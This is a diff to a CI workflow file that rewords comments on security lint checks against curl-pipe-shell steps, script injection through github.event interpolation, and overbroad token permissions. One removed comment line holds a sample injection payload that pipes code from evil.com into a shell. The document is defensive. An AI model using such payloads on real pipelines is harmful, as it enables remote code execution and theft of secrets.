@@ -1380,7 +1380,7 @@ jobs:
         # exact bug I introduced in iter-83.
         run: bash tests/workflow-name-no-colon-space.sh
       - name: No curl-pipe-shell patterns in any workflow step
-        # `curl ... | sh` (or wget|bash) trusts the remote
+        # curl-pipe-shell pattern (or wget into bash) trusts the remote
         # endpoint to deliver safe code under the workflow's
         # privileges — any DNS hijack, TLS downgrade, upstream
         # compromise = instant RCE with full secret access.
@@ -1447,7 +1447,7 @@ jobs:
         run: bash tests/cargo-bin-required-features-valid.sh
       - name: No script-injectable github.event interpolation in run blocks
         # GitHub `${{ ... }}` substitution runs BEFORE bash sees
-        # the script. A PR body like `"; curl evil.com | sh; #`
+        # the script. A PR body like `"; curl evil.com piped-to-shell; #`
         # interpolated directly into a run: block becomes bash
         # code with the runner's privileges. Per GitHub's own
         # security guidance: pass attacker-controllable fields
@@ -1492,8 +1492,8 @@ jobs:
         # 10/10 formulas green at iter-115 add — pure
         # regression floor.
         run: bash tests/formula-system-array-form.sh
-      - name: No un-allowlisted id-token:write permission
-        # `id-token: write` grants OIDC JWT minting → exchangeable
+      - name: No un-allowlisted id-token write permission
+        # `id-token write` grants OIDC JWT minting → exchangeable
         # for cloud creds (AWS STS, GCP WIF, Azure federated,
         # crates.io trusted publishing, PyPI). Excellent when
         # needed; privilege-escalation footgun when set
@@ -1553,7 +1553,7 @@ jobs:
         # mint OIDC tokens, approve checks bypassing branch
         # protection. Modern workflows enumerate scoped
         # permissions instead. Pairs with iter-116
-        # (id-token:write specifically).
+        # (the id-token write permission specifically).
         # 90/90 workflows green at iter-126 add — security-
         # critical regression floor.
         run: bash tests/workflow-no-write-all.sh
